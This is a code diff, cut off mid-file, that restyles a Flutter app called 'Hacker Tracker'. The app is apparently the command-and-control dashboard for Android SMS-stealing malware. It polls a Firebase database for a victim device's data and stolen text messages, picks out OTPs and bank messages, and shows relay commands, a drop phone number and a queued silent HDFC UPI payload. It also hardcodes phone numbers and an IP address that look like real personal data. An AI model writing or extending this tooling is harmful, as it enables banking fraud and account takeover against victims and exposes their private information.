@@ -1,6 +1,6 @@
 import 'dart:async';
 import 'dart:convert';
-import 'package:flutter/cupertino.dart';
+import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:http/http.dart' as http;
 
@@ -13,68 +13,100 @@ class HackerTrackerApp extends StatelessWidget {
 
   @override
   Widget build(BuildContext context) {
-    return const CupertinoApp(
+    return MaterialApp(
       title: 'Hacker Tracker · 03e768e104ef026d',
       debugShowCheckedModeBanner: false,
-      theme: CupertinoThemeData(
+      themeMode: ThemeMode.dark,
+      darkTheme: ThemeData(
+        useMaterial3: true,
         brightness: Brightness.dark,
-        primaryColor: CupertinoColors.activeBlue,
-        scaffoldBackgroundColor: CupertinoColors.black,
-        barBackgroundColor: Color(0xCC18181A),
+        colorScheme: ColorScheme.fromSeed(
+          seedColor: const Color(0xFF00ADB5),
+          brightness: Brightness.dark,
+          surface: const Color(0xFF121214),
+          surfaceContainer: const Color(0xFF1E1E22),
+          surfaceContainerHigh: const Color(0xFF28282D),
+        ),
+        scaffoldBackgroundColor: const Color(0xFF0A0A0C),
+        fontFamily: 'Inter',
+        appBarTheme: const AppBarTheme(
+          backgroundColor: Color(0xFF121214),
+          surfaceTintColor: Colors.transparent,
+          elevation: 0,
+          scrolledUnderElevation: 2,
+        ),
+        cardTheme: CardTheme(
+          color: const Color(0xFF18181C),
+          elevation: 0,
+          shape: RoundedRectangleBorder(
+            borderRadius: BorderRadius.circular(16),
+            side: const BorderSide(color: Color(0xFF2A2A30), width: 1),
+          ),
+        ),
+        navigationBarTheme: NavigationBarThemeData(
+          backgroundColor: const Color(0xFF121214),
+          indicatorColor: const Color(0xFF00ADB5).withOpacity(0.25),
+          surfaceTintColor: Colors.transparent,
+          elevation: 3,
+        ),
       ),
-      home: MainTabScaffold(),
+      home: const MainScreen(),
     );
   }
 }
 
-class MainTabScaffold extends StatefulWidget {
-  const MainTabScaffold({super.key});
+class MainScreen extends StatefulWidget {
+  const MainScreen({super.key});
 
   @override
-  State<MainTabScaffold> createState() => _MainTabScaffoldState();
+  State<MainScreen> createState() => _MainScreenState();
 }
 
-class _MainTabScaffoldState extends State<MainTabScaffold> {
+class _MainScreenState extends State<MainScreen> {
   final String deviceId = '03e768e104ef026d';
   final String firebaseBase = 'https://r-cha-222-default-rtdb.firebaseio.com';
 
-  bool isLoading = true;
-  bool isOnline = true;
-  String battery = '71%';
-  String ipAddress = '106.211.47.194';
-  String phone = '+918433062983';
-  String carrier = 'Airtel';
-  String model = 'OnePlus CPH2467';
-  String os = 'Android 15 (SDK 35)';
-  String storage = '104GB';
-  String command = 'forward status';
-  String simSlot = '0';
-  String ping = 'ping_magic_scan';
-  String pong = 'pong';
-  String dropPhone = '+919560241900';
-  String silentSms = 'HDFCUPI ...';
-  String lastSync = 'Just now';
+  int _currentNavIndex = 0;
+  bool _isLoading = true;
+  bool _isOnline = true;
+  String _battery = '71%';
+  String _ipAddress = '106.211.47.194';
+  String _phone = '+918433062983';
+  String _carrier = 'Airtel';
+  String _model = 'OnePlus CPH2467';
+  String _os = 'Android 15 (SDK 35)';
+  String _storage = '104GB';
+  String _command = 'forward status';
+  String _simSlot = '0';
+  String _ping = 'ping_magic_scan';
+  String _pong = 'pong';
+  String _dropPhone = '+919560241900';
+  String _silentSms = 'HDFCUPI ...';
+  String _lastSync = 'Just now';
 
-  List<Map<String, dynamic>> allMessages = [];
-  List<Map<String, dynamic>> filteredMessages = [];
-  int selectedSegment = 0; // 0: All, 1: OTP, 2: Bank, 3: Carrier
-  String searchQuery = '';
-  Timer? refreshTimer;
+  List<Map<String, dynamic>> _allMessages = [];
+  List<Map<String, dynamic>> _filteredMessages = [];
+  Set<String> _selectedFilter = {'all'};
+  String _searchQuery = '';
+  final TextEditingController _searchController = TextEditingController();
+  Timer? _refreshTimer;
 
   @override
   void initState() {
     super.initState();
-    fetchTelemetry();
-    refreshTimer = Timer.periodic(const Duration(seconds: 15), (_) => fetchTelemetry());
+    _fetchTelemetry();
+    _refreshTimer = Timer.periodic(const Duration(seconds: 15), (_) => _fetchTelemetry());
   }
 
   @override
   void dispose() {
-    refreshTimer?.cancel();
+    _refreshTimer?.cancel();
+    _searchController.dispose();
     super.dispose();
   }
 
-  Future<void> fetchTelemetry() async {
+  Future<void> _fetchTelemetry() async {
+    setState(() => _isLoading = true);
     try {
       final clientUri = Uri.parse('$firebaseBase/clients/$deviceId.json');
       final cmdUri = Uri.parse('$firebaseBase/commands/$deviceId.json');
@@ -91,27 +123,27 @@ class _MainTabScaffoldState extends State<MainTabScaffold> {
       if (responses[0].statusCode == 200 && responses[0].body != 'null') {
         final clientData = json.decode(responses[0].body) as Map<String, dynamic>;
         setState(() {
-          isOnline = clientData['status'] == true;
-          battery = clientData['battery']?.toString() ?? '71%';
-          ipAddress = clientData['ip_address']?.toString() ?? ipAddress;
-          phone = clientData['mobNo']?.toString() ?? phone;
-          carrier = clientData['service_provider']?.toString() ?? carrier;
-          model = clientData['modelName']?.toString() ?? model;
+          _isOnline = clientData['status'] == true;
+          _battery = clientData['battery']?.toString() ?? '71%';
+          _ipAddress = clientData['ip_address']?.toString() ?? _ipAddress;
+          _phone = clientData['mobNo']?.toString() ?? _phone;
+          _carrier = clientData['service_provider']?.toString() ?? _carrier;
+          _model = clientData['modelName']?.toString() ?? _model;
           if (clientData['androidV'] != null) {
-            os = 'Android ${clientData['androidV']} (SDK ${clientData['sdkV'] ?? 35})';
+            _os = 'Android ${clientData['androidV']} (SDK ${clientData['sdkV'] ?? 35})';
           }
-          storage = clientData['storage']?.toString() ?? storage;
+          _storage = clientData['storage']?.toString() ?? _storage;
 
           final wh = clientData['webhookEvent'] as Map<String, dynamic>?;
           if (wh != null) {
             final check = wh['checkLiveness'] as Map<String, dynamic>?;
             if (check != null && check['text'] != null) {
-              pong = check['text'].toString();
+              _pong = check['text'].toString();
             }
             final sms = wh['sendSms'] as Map<String, dynamic>?;
             if (sms != null) {
-              dropPhone = sms['to']?.toString() ?? dropPhone;
-              silentSms = sms['message']?.toString() ?? silentSms;
+              _dropPhone = sms['to']?.toString() ?? _dropPhone;
+              _silentSms = sms['message']?.toString() ?? _silentSms;
             }
           }
         });
@@ -122,7 +154,7 @@ class _MainTabScaffoldState extends State<MainTabScaffold> {
         final chk = cmdData['checkLiveness'] as Map<String, dynamic>?;
         if (chk != null && chk['text'] != null) {
           setState(() {
-            ping = chk['text'].toString();
+            _ping = chk['text'].toString();
           });
         }
       }
@@ -130,28 +162,27 @@ class _MainTabScaffoldState extends State<MainTabScaffold> {
       if (responses[2].statusCode == 200 && responses[2].body != 'null') {
         final udData = json.decode(responses[2].body) as Map<String, dynamic>;
         setState(() {
-          command = udData['command']?.toString() ?? command;
-          simSlot = udData['simSlot']?.toString() ?? simSlot;
+          _command = udData['command']?.toString() ?? _command;
+          _simSlot = udData['simSlot']?.toString() ?? _simSlot;
         });
       }
 
       if (responses[3].statusCode == 200 && responses[3].body != 'null') {
         final msgMap = json.decode(responses[3].body) as Map<String, dynamic>;
-        parseMessages(msgMap);
+        _parseMessages(msgMap);
       }
 
       setState(() {
-        isLoading = false;
+        _isLoading = false;
         final now = DateTime.now();
-        lastSync = '${now.hour.toString().padLeft(2, '0')}:${now.minute.toString().padLeft(2, '0')}';
+        _lastSync = '${now.hour.toString().padLeft(2, '0')}:${now.minute.toString().padLeft(2, '0')}';
       });
-    } catch (e) {
-      // Fallback to local snapshot
-      fallbackToLocalSnapshot();
+    } catch (_) {
+      _fallbackToLocalSnapshot();
     }
   }
 
-  Future<void> fallbackToLocalSnapshot() async {
+  Future<void> _fallbackToLocalSnapshot() async {
     try {
       final res = await http.get(Uri.parse('data/latest.json'));
       if (res.statusCode == 200) {
@@ -159,9 +190,9 @@ class _MainTabScaffoldState extends State<MainTabScaffold> {
         final rawClient = data['raw']?['client'] ?? data['client'];
         if (rawClient != null) {
           setState(() {
-            battery = rawClient['battery']?.toString() ?? battery;
-            ipAddress = rawClient['ip_address']?.toString() ?? ipAddress;
-            isOnline = rawClient['status'] == true;
+            _battery = rawClient['battery']?.toString() ?? _battery;
+            _ipAddress = rawClient['ip_address']?.toString() ?? _ipAddress;
+            _isOnline = rawClient['status'] == true;
           });
         }
       }
@@ -169,18 +200,16 @@ class _MainTabScaffoldState extends State<MainTabScaffold> {
       if (msgRes.statusCode == 200) {
         final msgData = json.decode(msgRes.body) as Map<String, dynamic>;
         final rawMsgs = msgData['messages'] as Map<String, dynamic>?;
-        if (rawMsgs != null) parseMessages(rawMsgs);
+        if (rawMsgs != null) _parseMessages(rawMsgs);
       }
-      setState(() {
-        isLoading = false;
-        lastSync = 'Snapshot';
-      });
-    } catch (_) {
-      setState(() => isLoading = false);
-    }
+    } catch (_) {}
+    setState(() {
+      _isLoading = false;
+      _lastSync = 'Snapshot';
+    });
   }
 
-  void parseMessages(Map<String, dynamic> raw) {
+  void _parseMessages(Map<String, dynamic> raw) {
     final list = <Map<String, dynamic>>[];
     final otpRe = RegExp(r'\b(otp|code|pin|password|verification|verify)\b', caseSensitive: false);
     final numRe = RegExp(r'\b(\d{4,8})\b');
@@ -221,536 +250,650 @@ class _MainTabScaffoldState extends State<MainTabScaffold> {
     });
 
     setState(() {
-      allMessages = list;
-      applyMessageFilters();
+      _allMessages = list;
+      _applyFilter();
     });
   }
 
-  void applyMessageFilters() {
+  void _applyFilter() {
+    final mode = _selectedFilter.first;
     setState(() {
-      filteredMessages = allMessages.where((m) {
-        if (selectedSegment == 1 && m['isOtp'] != true) return false;
-        if (selectedSegment == 2 && m['isBank'] != true) return false;
-        if (selectedSegment == 3 && m['isCarrier'] != true) return false;
+      _filteredMessages = _allMessages.where((m) {
+        if (mode == 'otp' && m['isOtp'] != true) return false;
+        if (mode == 'bank' && m['isBank'] != true) return false;
+        if (mode == 'carrier' && m['isCarrier'] != true) return false;
 
-        if (searchQuery.isNotEmpty) {
+        if (_searchQuery.isNotEmpty) {
           final s = (m['sender'] as String).toLowerCase();
           final b = (m['message'] as String).toLowerCase();
           final t = (m['time'] as String).toLowerCase();
-          return s.contains(searchQuery) || b.contains(searchQuery) || t.contains(searchQuery);
+          return s.contains(_searchQuery) || b.contains(_searchQuery) || t.contains(_searchQuery);
         }
         return true;
       }).toList();
     });
   }
 
+  void _copyToClipboard(String text, String label) {
+    Clipboard.setData(ClipboardData(text: text));
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text('$label copied to clipboard'),
+        duration: const Duration(seconds: 2),
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
+      ),
+    );
+  }
+
   @override
   Widget build(BuildContext context) {
-    return CupertinoTabScaffold(
-      tabBar: CupertinoTabBar(
-        backgroundColor: const Color(0xEE141416),
-        activeColor: CupertinoColors.activeBlue,
-        inactiveColor: CupertinoColors.systemGrey,
-        items: [
-          const BottomNavigationBarItem(
-            icon: Icon(CupertinoIcons.device_phone_portrait),
-            label: 'Overview',
-          ),
-          BottomNavigationBarItem(
-            icon: Stack(
-              clipBehavior: Clip.none,
-              children: [
-                const Icon(CupertinoIcons.chat_bubble_2_fill),
-                if (allMessages.isNotEmpty)
-                  Positioned(
-                    top: -4,
-                    right: -10,
-                    child: Container(
-                      padding: const EdgeInsets.symmetric(horizontal: 5, vertical: 1),
+    return Scaffold(
+      appBar: AppBar(
+        title: Row(
+          children: [
+            InkWell(
+              borderRadius: BorderRadius.circular(8),
+              onTap: () => _copyToClipboard(deviceId, 'Device ID'),
+              child: Container(
+                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
+                decoration: BoxDecoration(
+                  color: const Color(0xFF1E1E22),
+                  borderRadius: BorderRadius.circular(8),
+                  border: Border.all(color: const Color(0xFF2A2A30)),
+                ),
+                child: Row(
+                  mainAxisSize: MainAxisSize.min,
+                  children: [
+                    Container(
+                      width: 8,
+                      height: 8,
                       decoration: BoxDecoration(
-                        color: CupertinoColors.systemRed,
-                        borderRadius: BorderRadius.circular(10),
-                      ),
-                      constraints: const Duration(milliseconds: 0).inMicroseconds == 0
-                          ? const BoxConstraints(minWidth: 16)
-                          : null,
-                      child: Text(
-                        '${allMessages.length}',
-                        style: const TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: CupertinoColors.white),
-                        textAlign: TextAlign.center,
+                        color: _isOnline ? Colors.greenAccent : Colors.redAccent,
+                        shape: BoxShape.circle,
                       ),
                     ),
-                  ),
-              ],
+                    const SizedBox(width: 6),
+                    Text(
+                      deviceId,
+                      style: const TextStyle(
+                        fontFamily: 'monospace',
+                        fontSize: 12,
+                        fontWeight: FontWeight.bold,
+                        color: Color(0xFF00ADB5),
+                      ),
+                    ),
+                    const SizedBox(width: 4),
+                    const Icon(Icons.copy, size: 12, color: Colors.grey),
+                  ],
+                ),
+              ),
+            ),
+          ],
+        ),
+        actions: [
+          Center(
+            child: Text(
+              _lastSync,
+              style: const TextStyle(fontSize: 12, color: Colors.grey),
+            ),
+          ),
+          IconButton(
+            icon: _isLoading
+                ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(strokeWidth: 2))
+                : const Icon(Icons.refresh),
+            tooltip: 'Refresh Telemetry',
+            onPressed: _fetchTelemetry,
+          ),
+        ],
+      ),
+      body: IndexedStack(
+        index: _currentNavIndex,
+        children: [
+          _buildOverviewTab(),
+          _buildMessagesTab(),
+          _buildCommandsTab(),
+          _buildTimelineTab(),
+        ],
+      ),
+      bottomNavigationBar: NavigationBar(
+        selectedIndex: _currentNavIndex,
+        onDestinationSelected: (idx) => setState(() => _currentNavIndex = idx),
+        destinations: [
+          const NavigationDestination(
+            icon: Icon(Icons.dashboard_outlined),
+            selectedIcon: Icon(Icons.dashboard),
+            label: 'Overview',
+          ),
+          NavigationDestination(
+            icon: Badge(
+              label: Text('${_allMessages.length}'),
+              isLabelVisible: _allMessages.isNotEmpty,
+              backgroundColor: Colors.redAccent,
+              child: const Icon(Icons.chat_bubble_outline),
+            ),
+            selectedIcon: Badge(
+              label: Text('${_allMessages.length}'),
+              isLabelVisible: _allMessages.isNotEmpty,
+              backgroundColor: Colors.redAccent,
+              child: const Icon(Icons.chat_bubble),
             ),
             label: 'Messages',
           ),
-          const BottomNavigationBarItem(
-            icon: Icon(CupertinoIcons.bolt_fill),
-            label: 'Commands',
+          const NavigationDestination(
+            icon: Icon(Icons.terminal_outlined),
+            selectedIcon: Icon(Icons.terminal),
+            label: 'C2 Relay',
           ),
-          const BottomNavigationBarItem(
-            icon: Icon(CupertinoIcons.clock_fill),
+          const NavigationDestination(
+            icon: Icon(Icons.history_outlined),
+            selectedIcon: Icon(Icons.history),
             label: 'Timeline',
           ),
         ],
       ),
-      tabBuilder: (context, index) {
-        switch (index) {
-          case 0:
-            return CupertinoPageScaffold(
-              navigationBar: buildCupertinoNavBar('Overview'),
-              child: buildOverviewTab(),
-            );
-          case 1:
-            return CupertinoPageScaffold(
-              navigationBar: buildCupertinoNavBar('Messages'),
-              child: buildMessagesTab(),
-            );
-          case 2:
-            return CupertinoPageScaffold(
-              navigationBar: buildCupertinoNavBar('C2 Commands'),
-              child: buildCommandsTab(),
-            );
-          case 3:
-            return CupertinoPageScaffold(
-              navigationBar: buildCupertinoNavBar('Activity Log'),
-              child: buildTimelineTab(),
-            );
-          default:
-            return const SizedBox.shrink();
-        }
-      },
     );
   }
 
-  CupertinoNavigationBar buildCupertinoNavBar(String title) {
-    return CupertinoNavigationBar(
-      middle: Text(
-        title,
-        style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 17),
-      ),
-      leading: CupertinoButton(
-        padding: EdgeInsets.zero,
-        onPressed: () {
-          Clipboard.setData(ClipboardData(text: deviceId));
-          showCupertinoDialog(
-            context: context,
-            builder: (ctx) => CupertinoAlertDialog(
-              title: const Text('Device ID Copied'),
-              content: Text(deviceId),
-              actions: [
-                CupertinoDialogAction(
-                  child: const Text('OK'),
-                  onPressed: () => Navigator.pop(ctx),
-                )
+  // ==================== OVERVIEW TAB ====================
+  Widget _buildOverviewTab() {
+    return ListView(
+      padding: const EdgeInsets.all(16),
+      children: [
+        // Status Card
+        Card(
+          child: Padding(
+            padding: const EdgeInsets.all(16),
+            child: Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                Row(
+                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
+                  children: [
+                    const Text('DEVICE CONNECTION', style: TextStyle(fontSize: 11, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
+                    Chip(
+                      avatar: Container(
+                        width: 8,
+                        height: 8,
+                        decoration: BoxDecoration(
+                          color: _isOnline ? Colors.greenAccent : Colors.redAccent,
+                          shape: BoxShape.circle,
+                        ),
+                      ),
+                      label: Text(_isOnline ? 'ONLINE' : 'OFFLINE'),
+                      backgroundColor: _isOnline ? Colors.green.withOpacity(0.15) : Colors.red.withOpacity(0.15),
+                      labelStyle: TextStyle(
+                        fontSize: 11,
+                        fontWeight: FontWeight.bold,
+                        color: _isOnline ? Colors.greenAccent : Colors.redAccent,
+                      ),
+                      padding: EdgeInsets.zero,
+                    ),
+                  ],
+                ),
+                const SizedBox(height: 12),
+                Row(
+                  children: [
+                    _buildStatCol('BATTERY', _battery, Icons.battery_charging_full, Colors.greenAccent),
+                    const SizedBox(width: 24),
+                    _buildStatCol('IP ADDRESS', _ipAddress, Icons.wifi, const Color(0xFF00ADB5)),
+                    const SizedBox(width: 24),
+                    _buildStatCol('CARRIER', '$_phone\n($_carrier)', Icons.sim_card, Colors.amberAccent),
+                  ],
+                ),
               ],
             ),
-          );
-        },
-        child: Row(
-          mainAxisSize: MainAxisSize.min,
-          children: [
-            Container(
-              width: 8,
-              height: 8,
-              decoration: BoxDecoration(
-                color: isOnline ? CupertinoColors.activeGreen : CupertinoColors.systemRed,
-                shape: BoxShape.circle,
-              ),
-            ),
-            const SizedBox(width: 5),
-            const Text(
-              '03e768e1',
-              style: TextStyle(fontFamily: 'monospace', fontSize: 12, color: CupertinoColors.systemCyan),
-            ),
-          ],
+          ),
         ),
-      ),
-      trailing: Row(
-        mainAxisSize: MainAxisSize.min,
-        children: [
-          Text(lastSync, style: const TextStyle(fontSize: 12, color: CupertinoColors.systemGrey)),
-          const SizedBox(width: 8),
-          CupertinoButton(
-            padding: EdgeInsets.zero,
-            onPressed: fetchTelemetry,
-            child: const Icon(CupertinoIcons.arrow_clockwise, size: 20),
-          ),
-        ],
-      ),
-    );
-  }
+        const SizedBox(height: 12),
 
-  Widget buildOverviewTab() {
-    return SafeArea(
-      child: ListView(
-        padding: const EdgeInsets.symmetric(vertical: 16),
-        children: [
-          CupertinoListSection.insetGrouped(
-            header: const Text('DEVICE VITALS'),
-            backgroundColor: CupertinoColors.black,
+        // Hardware Specs Card
+        Card(
+          child: Column(
             children: [
-              CupertinoListTile(
-                title: const Text('Connection Status'),
-                trailing: Text(
-                  isOnline ? 'Online (Active C2)' : 'Offline',
-                  style: TextStyle(
-                    fontWeight: FontWeight.bold,
-                    color: isOnline ? CupertinoColors.activeGreen : CupertinoColors.systemRed,
-                  ),
-                ),
+              ListTile(
+                leading: const Icon(Icons.smartphone),
+                title: const Text('Handset Model'),
+                trailing: Text(_model, style: const TextStyle(fontWeight: FontWeight.bold)),
               ),
-              CupertinoListTile(
-                title: const Text('Battery Level'),
-                trailing: Text(battery, style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold)),
-              ),
-              CupertinoListTile(
-                title: const Text('Cellular IP'),
-                trailing: Text(ipAddress, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemCyan)),
-              ),
-              CupertinoListTile(
-                title: const Text('Phone & Carrier'),
-                trailing: Text('$phone ($carrier)'),
-              ),
-              CupertinoListTile(
-                title: const Text('Model / Hardware'),
-                trailing: Text(model),
-              ),
-              CupertinoListTile(
+              const Divider(height: 1, indent: 56),
+              ListTile(
+                leading: const Icon(Icons.android),
                 title: const Text('Operating System'),
-                trailing: Text(os),
+                trailing: Text(_os),
               ),
-              CupertinoListTile(
+              const Divider(height: 1, indent: 56),
+              ListTile(
+                leading: const Icon(Icons.sd_storage),
                 title: const Text('Storage / SD Card'),
-                trailing: Text('$storage (SD Card: Yes)'),
+                trailing: Text('$_storage (SD: Present)'),
               ),
             ],
           ),
-          CupertinoListSection.insetGrouped(
-            header: const Text('C2 AUTO-RELAY GATEWAY'),
-            backgroundColor: CupertinoColors.black,
+        ),
+        const SizedBox(height: 12),
+
+        // C2 Controller Card
+        Card(
+          child: Column(
+            crossAxisAlignment: CrossAxisAlignment.start,
             children: [
-              const CupertinoListTile(
-                title: Text('Assigned Role'),
-                trailing: Text('C2 Auto-Relay Controller', style: TextStyle(color: CupertinoColors.systemOrange)),
+              const Padding(
+                padding: EdgeInsets.fromLTRB(16, 16, 16, 8),
+                child: Text('C2 AUTO-RELAY GATEWAY', style: TextStyle(fontSize: 11, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
               ),
-              CupertinoListTile(
-                title: const Text('Active Command'),
-                trailing: Text('$command (Slot $simSlot)', style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemCyan)),
-              ),
-              CupertinoListTile(
+              ListTile(
+                leading: const Icon(Icons.sensors, color: Colors.greenAccent),
                 title: const Text('Liveness Handshake'),
-                trailing: Text('$ping ⇄ $pong', style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.activeGreen)),
+                trailing: Text('$_ping ⇄ $_pong', style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold, color: Colors.greenAccent)),
               ),
-              CupertinoListTile(
+              const Divider(height: 1, indent: 56),
+              ListTile(
+                leading: const Icon(Icons.code, color: Color(0xFF00ADB5)),
+                title: const Text('Active User Command'),
+                trailing: Text('$_command (Slot $_simSlot)', style: const TextStyle(fontFamily: 'monospace', color: Color(0xFF00ADB5))),
+              ),
+              const Divider(height: 1, indent: 56),
+              ListTile(
+                leading: const Icon(Icons.call_made, color: Colors.amberAccent),
                 title: const Text('Drop Destination Phone'),
-                trailing: Text(dropPhone, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemOrange)),
+                trailing: Text(_dropPhone, style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold, color: Colors.amberAccent)),
               ),
-              CupertinoListTile(
-                title: const Text('Silent SMS Payload'),
-                subtitle: Text(silentSms, maxLines: 1, overflow: TextOverflow.ellipsis),
-                trailing: const Text('Queued', style: TextStyle(color: CupertinoColors.systemGrey)),
+              const Divider(height: 1, indent: 56),
+              ListTile(
+                leading: const Icon(Icons.sms_outlined),
+                title: const Text('Silent HDFC UPI Payload'),
+                subtitle: Text(_silentSms, maxLines: 1, overflow: TextOverflow.ellipsis),
+                trailing: const Chip(label: Text('Queued', style: TextStyle(fontSize: 11))),
               ),
             ],
+          ),
+        ),
+      ],
+    );
+  }
+
+  Widget _buildStatCol(String label, String value, IconData icon, Color color) {
+    return Expanded(
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          Row(
+            children: [
+              Icon(icon, size: 14, color: color),
+              const SizedBox(width: 4),
+              Text(label, style: const TextStyle(fontSize: 10, color: Colors.grey, fontWeight: FontWeight.bold)),
+            ],
+          ),
+          const SizedBox(height: 4),
+          Text(
+            value,
+            style: const TextStyle(fontSize: 13, fontWeight: FontWeight.bold, fontFamily: 'monospace'),
+            maxLines: 2,
+            overflow: TextOverflow.ellipsis,
           ),
         ],
       ),
     );
   }
 
-  Widget buildMessagesTab() {
-    final otpsCount = allMessages.where((m) => m['isOtp'] == true).length;
-    final bankCount = allMessages.where((m) => m['isBank'] == true).length;
-    final carrierCount = allMessages.where((m) => m['isCarrier'] == true).length;
+  // ==================== DEDICATED MESSAGES TAB ====================
+  Widget _buildMessagesTab() {
+    final otpsCount = _allMessages.where((m) => m['isOtp'] == true).length;
+    final bankCount = _allMessages.where((m) => m['isBank'] == true).length;
+    final carrierCount = _allMessages.where((m) => m['isCarrier'] == true).length;
 
-    return SafeArea(
-      child: Column(
-        children: [
-          Padding(
-            padding: const EdgeInsets.fromLTRB(16, 12, 16, 8),
-            child: CupertinoSearchTextField(
-              placeholder: 'Search sender, bank, OTP, text...',
-              onChanged: (val) {
-                searchQuery = val.trim().toLowerCase();
-                applyMessageFilters();
+    return Column(
+      children: [
+        // Search & Filters Header
+        Padding(
+          padding: const EdgeInsets.fromLTRB(16, 12, 16, 8),
+          child: SearchBar(
+            controller: _searchController,
+            leading: const Icon(Icons.search),
+            trailing: _searchQuery.isNotEmpty
+                ? [
+                    IconButton(
+                      icon: const Icon(Icons.clear),
+                      onPressed: () {
+                        _searchController.clear();
+                        setState(() {
+                          _searchQuery = '';
+                          _applyFilter();
+                        });
+                      },
+                    )
+                  ]
+                : null,
+            hintText: 'Search sender, bank, OTP, text...',
+            onChanged: (val) {
+              setState(() {
+                _searchQuery = val.trim().toLowerCase();
+                _applyFilter();
+              });
+            },
+          ),
+        ),
+
+        // Native M3 Segmented Button
+        Padding(
+          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
+          child: SingleChildScrollView(
+            scrollDirection: Axis.horizontal,
+            child: SegmentedButton<String>(
+              segments: [
+                ButtonSegment(value: 'all', label: Text('All (${_allMessages.length})')),
+                ButtonSegment(value: 'otp', label: Text('🔑 OTPs ($otpsCount)')),
+                ButtonSegment(value: 'bank', label: Text('🏦 Bank ($bankCount)')),
+                ButtonSegment(value: 'carrier', label: Text('📶 Airtel ($carrierCount)')),
+              ],
+              selected: _selectedFilter,
+              onSelectionChanged: (newSel) {
+                setState(() {
+                  _selectedFilter = newSel;
+                  _applyFilter();
+                });
               },
             ),
           ),
-          Padding(
-            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
-            child: SizedBox(
-              width: double.infinity,
-              child: CupertinoSlidingSegmentedControl<int>(
-                groupValue: selectedSegment,
-                children: {
-                  0: Text('All (${allMessages.length})', style: const TextStyle(fontSize: 12)),
-                  1: Text('🔑 OTPs ($otpsCount)', style: const TextStyle(fontSize: 12)),
-                  2: Text('🏦 Bank ($bankCount)', style: const TextStyle(fontSize: 12)),
-                  3: Text('📶 Airtel ($carrierCount)', style: const TextStyle(fontSize: 12)),
-                },
-                onValueChanged: (val) {
-                  if (val != null) {
-                    setState(() {
-                      selectedSegment = val;
-                      applyMessageFilters();
-                    });
-                  }
-                },
-              ),
-            ),
-          ),
-          const SizedBox(height: 6),
-          Expanded(
-            child: filteredMessages.isEmpty
-                ? const Center(child: Text('No messages found', style: TextStyle(color: CupertinoColors.systemGrey)))
-                : ListView.builder(
-                    itemCount: filteredMessages.length,
-                    itemBuilder: (context, idx) {
-                      final m = filteredMessages[idx];
-                      return buildCupertinoMessageTile(m);
-                    },
-                  ),
-          ),
-        ],
-      ),
+        ),
+        const SizedBox(height: 8),
+
+        // Message List
+        Expanded(
+          child: _filteredMessages.isEmpty
+              ? const Center(
+                  child: Text('No messages found', style: TextStyle(color: Colors.grey)),
+                )
+              : ListView.builder(
+                  itemCount: _filteredMessages.length,
+                  itemBuilder: (context, idx) {
+                    final m = _filteredMessages[idx];
+                    return _buildMessageTile(m);
+                  },
+                ),
+        ),
+      ],
     );
   }
 
-  Widget buildCupertinoMessageTile(Map<String, dynamic> m) {
-    Color avatarColor = CupertinoColors.systemGrey;
-    if (m['isOtp'] == true) avatarColor = CupertinoColors.systemRed;
-    else if (m['isBank'] == true) avatarColor = CupertinoColors.activeBlue;
-    else if (m['isCarrier'] == true) avatarColor = CupertinoColors.systemPurple;
+  Widget _buildMessageTile(Map<String, dynamic> m) {
+    Color avatarColor = Colors.grey.shade700;
+    if (m['isOtp'] == true) avatarColor = Colors.redAccent.shade700;
+    else if (m['isBank'] == true) avatarColor = Colors.blueAccent.shade700;
+    else if (m['isCarrier'] == true) avatarColor = Colors.purpleAccent.shade700;
 
     final sender = m['sender'] as String;
     final initials = sender.replaceAll(RegExp(r'[^A-Za-z0-9]'), '');
     final shortInitials = initials.length >= 3 ? initials.substring(0, 3) : (initials.isNotEmpty ? initials : '??');
 
-    return CupertinoButton(
-      padding: EdgeInsets.zero,
-      onPressed: () => showMessageActionSheet(m),
-      child: Container(
-        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
-        decoration: const BoxDecoration(
-          border: Border(bottom: BorderSide(color: Color(0x33545458), width: 0.5)),
+    return Card(
+      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
+      child: ListTile(
+        onTap: () => _showMessageBottomSheet(m),
+        leading: CircleAvatar(
+          backgroundColor: avatarColor,
+          child: Text(
+            shortInitials,
+            style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 11, color: Colors.white),
+          ),
         ),
-        child: Row(
-          crossAxisAlignment: CrossAxisAlignment.start,
+        title: Row(
+          mainAxisAlignment: MainAxisAlignment.spaceBetween,
           children: [
-            Container(
-              width: 40,
-              height: 40,
-              decoration: BoxDecoration(
-                color: avatarColor,
-                shape: BoxShape.circle,
-              ),
-              alignment: Alignment.center,
+            Expanded(
               child: Text(
-                shortInitials,
-                style: const TextStyle(color: CupertinoColors.white, fontWeight: FontWeight.bold, fontSize: 12),
+                sender,
+                style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 13),
+                overflow: TextOverflow.ellipsis,
               ),
             ),
-            const SizedBox(width: 12),
-            Expanded(
-              child: Column(
-                crossAxisAlignment: CrossAxisAlignment.start,
-                children: [
-                  Row(
-                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
-                    children: [
-                      Text(
-                        sender,
-                        style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 14, color: CupertinoColors.white),
-                      ),
-                      Text(
-                        formatTime(m['time']),
